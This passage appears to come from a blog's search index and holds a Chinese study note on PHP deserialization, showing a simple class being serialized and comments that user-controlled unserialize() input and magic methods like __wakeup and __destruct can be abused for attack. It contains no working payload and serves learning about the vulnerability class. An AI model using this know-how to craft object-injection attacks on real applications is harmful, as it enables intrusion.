class="hljs-comment">//目的：为了方便PHP对象的传输和存储 --&gt;</span><br>&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span><br>&#123;<br>private $flag = <span class="hljs-string">&#x27;Inactive&#x27;</span>;<br>protected $test = <span class="hljs-string">&quot;test&quot;</span>;<br>public $test1 = <span class="hljs-string">&quot;test1&quot;</span>;<br><br>public <span class="hljs-keyword">function</span> <span class="hljs-title function_">set_flag</span>(<span class="hljs-params">$flag</span>)<br>&#123;<br>$this-&gt;flag = $flag;<br><br>&#125;<br>public <span class="hljs-keyword">function</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params"></span>)<br>&#123;<br><span class="hljs-keyword">return</span> $this-&gt;flag;<br>&#125;<br>&#125;<br>$object = <span class="hljs-keyword">new</span> <span class="hljs-title function_">test</span>();<br>$object-&gt;<span class="hljs-title function_">set_flag</span>(<span class="hljs-string">&#x27;Active&#x27;</span>);<br>$data = <span class="hljs-title function_">serialize</span>($object);<br>echo $data;<br>echo <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>#<span class="hljs-attr">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;testflag&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Active&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;*test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;&#125;<br>echo <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>?&gt;<br><br><span class="hljs-comment">//unserialize()接收的参数用户可控，传入构造的字符串，实现攻击</span><br><span class="hljs-comment">//只序列化属性，不序列化方法</span><br><span class="hljs-comment">//寻找合适的能够被控制的属性，利用本身存在的方法</span><br><br>&lt;!--只要在魔术方法中存在能利用的函数<br>对这个对象的属性做特殊的操控<br>进而影响这些函数的调用逻辑<br><span class="hljs-number">1</span>&gt;<span class="hljs-title function_">__construct</span>()<br><span class="hljs-number">2</span>&gt;<span class="hljs-title function_">__sleep</span>()<br><span class="hljs-number">3</span>&gt;<span class="hljs-title function_">__wakeup</span>()<br><span class="hljs-number">4</span>&gt;<span class="hljs-title function_">__destruct</span>()<br><span class="hljs-number">5</span>&gt;<span class="hljs-title function_">__toString</span>()把对象当作字符串使用时<br><span class="hljs-number">6</span>&gt;<span class="hljs-title function_">__invoke</span>()把对象当函数使用时<br><span class="hljs-number">7</span>&gt;<span class="hljs-title function_">__call</span>()调用对象不存在的方法的时候 <br>--&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>phpunserilize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
